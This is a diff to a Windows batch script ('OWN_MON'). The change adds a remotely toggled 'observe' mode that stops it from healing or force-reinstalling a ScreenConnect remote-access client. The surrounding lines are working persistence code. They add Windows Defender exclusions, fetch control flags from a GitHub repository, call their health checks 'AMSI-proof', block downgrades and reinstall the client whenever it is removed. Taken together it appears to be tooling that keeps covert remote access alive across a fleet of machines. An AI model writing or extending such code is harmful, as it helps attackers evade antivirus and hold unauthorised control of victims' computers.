@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M59
+rem  OWN_MON  BUILD 20260804M60
+rem  M60: OBSERVE mode — no heal/force/reinstall; log health to drop_trace.log (prove drop cause).
 rem  M59: stop drop+reinstall — clear force SKIP if healthy; HEAL/Ensure 1060-only; G9 never /x on HEAL.
 rem  M58: sticky version_floor.cfg — once updated, never apply/run older mon/lib/gryxa again.
 rem  M57: fleet_channel.cfg pin+floor; cmd-first Gryxa health (ignore AMSI garbage); no downgrade.
@@ -62,8 +63,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M59"
-set "MON_MIN=M58"
+set "MONVER=M60"
+set "MON_MIN=M59"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
 set "FLOOR_FILE=%WD%\version_floor.cfg"
@@ -572,7 +573,22 @@ set "GRYXA_OK=0"
 set "GRYXA_WAS=0"
 set "DO_DEEP=0"
 set "FORCE_G=0"
+set "OBSERVE=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
+
+rem M60: observe.flag from repo — fleet-wide freeze of heal/force so we can see real drop cause
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%WD%\observe.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/observe.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%WD%\observe.new" (
+  findstr /I /C:"OBSERVE" "%WD%\observe.new" >nul 2>&1
+  if not errorlevel 1 (
+    set "OBSERVE=1"
+    copy /y "%WD%\observe.new" "%WD%\observe.flag" >nul 2>&1
+  ) else (
+    del /f /q "%WD%\observe.flag" >nul 2>&1
+  )
+)
+if exist "%WD%\observe.flag" set "OBSERVE=1"
+if "!OBSERVE!"=="1" echo gryxa_OBSERVE_mode_no_heal_no_force>>"%LOG%"
 
 rem FORCE push: content-hash via fc /b (re-fire when flag content changes); raw-first
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
@@ -588,6 +604,7 @@ if exist "%WD%\force_gryxa.new" (
     )
   )
 )
+if "!OBSERVE!"=="1" set "FORCE_G=0"
 
 rem Detect Gryxa — CMD first (AMSI-proof). Only trust PS health if line starts with HEALTHY|BROKEN|STUCK|ABSENT|
 set "GH="
@@ -637,6 +654,11 @@ echo gryxa_health=!GH!>>"%LOG%"
 
 rem FORCE push: never /x a live Guest — ack if already healthy; REINSTALL only when absent
 if "%FORCE_G%"=="1" (
+  if "!OBSERVE!"=="1" (
+    echo gryxa_force_suppressed_OBSERVE>>"%LOG%"
+    if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
+    goto :GryxaAfter
+  )
   if "!GRYXA_OK!"=="1" (
     echo gryxa_force_skip_already_healthy>>"%LOG%"
   ) else (
@@ -746,7 +768,10 @@ if "!GRYXA_OK!"=="0" (
 
 rem heal ONLY on hard 1060 (service missing). Never msiexec while svc exists.
 set "NEED_HEAL=0"
-if "!GRYXA_OK!"=="0" (
+if "!OBSERVE!"=="1" (
+  echo gryxa_observe_skip_heal GRYXA_OK=!GRYXA_OK!>>"%LOG%"
+  echo %DATE% %TIME% observe ok=!GRYXA_OK! fp=%GRYXA_FP% gh=!GH!>>"%WD%\drop_trace.log"
+) else if "!GRYXA_OK!"=="0" (
   sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
   if errorlevel 1 (
     set "NEED_HEAL=1"
@@ -759,6 +784,7 @@ if "!NEED_HEAL!"=="1" call :QueueGryxaHeal HEAL
 
 if "%DO_DEEP%"=="1" echo done>"%GRYXA_DEEP%"
 echo gryxa_freeze_or_heal_done>>"%LOG%"
+echo %DATE% %TIME% tick_gryxa ok=!GRYXA_OK! observe=!OBSERVE! force=!FORCE_G!>>"%WD%\drop_trace.log"
 
 :GryxaAfter
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
@@ -986,6 +1012,10 @@ if not errorlevel 1 (
   exit /b 0
 )
 echo gryxa_must_1060_queue_heal>>"%LOG%"
+if exist "%WD%\observe.flag" (
+  echo gryxa_must_observe_skip_heal>>"%LOG%"
+  exit /b 0
+)
 call :QueueGryxaHeal HEAL
 exit /b 0
 
